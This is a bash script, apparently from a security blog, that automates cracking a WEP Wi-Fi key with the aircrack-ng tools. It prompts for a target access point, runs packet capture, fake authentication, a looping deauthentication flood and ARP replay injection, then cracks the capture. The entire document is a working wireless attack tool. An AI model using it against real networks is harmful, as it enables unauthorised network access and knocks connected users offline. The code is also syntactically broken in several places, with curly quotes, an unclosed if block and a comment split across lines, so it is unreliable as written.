#!/bin/bash
#####################################################################
# Programer : Yamlal Gotame (IT Secure Net)
#
# Program : Crack Wifi WEP using Kali / Backtrack
#
# FileName : wepAutoITSecure.sh
#
####################################################################
export IFACE
export BSSID
export CHANNEL
export SSID
export CMAC
# Confirm the argument enter
if [ -z $1 ] then echo “Usage: $0 <nameOfInterface>”
echo “Please, Enter filename + interface to use for crack”
echo “Set interface in MONITOR mode : airmong- interface.”
exit
fi
#Start airodump-ng to AP information
IFACE=$1
echo “Starting listing… Do CTRL + C when you find AP”
sleep 3
sudo airodump-ng $IFACE
# Ask Information of AP
echo “### AP INFORMATION ###”
echo “Enter BSSID: “; read BSSID
echo “Enter AP Channel: “; read CHANNEL
echo “Enter Client MAC(optional): “; read CMAC
echo “Enter AP SSID:”; read SSID
echo “Starting WEP Cracking with these parameters: ”
echo “”
echo ” Interface: $IFACE”;
echo ” Channel: $CHANNEL”;
echo ” BSSID: $BSSID”;
echo ” SSID: $SSID”;
if [ -z “$CMAC” ]; then
echo “No client MAC”
else
echo ” Client MAC: $CMAC”;
# Start airodump-ng to capture data
xterm -e “airodump-ng –bssid $BSSID –channel $CHANNEL -w $SSID $IFACE” &
# Start aireplay-ng for fake authentification.
xterm -e “aireplay-ng -1 0 -a $BSSID -h $CMAC $IFACE” &
# Wait for fake association before deauthentification.(Simley Face :) )
sleep 15
xterm -e “while true; do aireplay-ng -0 9 -a $BSSID $IFACE; sleep 15; done” &
# Start aireplay-ng for ARP replay Inject packets
xterm -e “aireplay-ng -3 -b $BSSID $IFACE” &
echo “Press enter when you have enough data (minimum : 10 000 IVS)”; read enterS
echo “We will wait for few moments… 30 sec”
sleep 30
# Start cracking .cap file after giving some time to generate
initialization vectors(iv’s)
xterm -e “aircrack-ng $SSID*.cap” & 
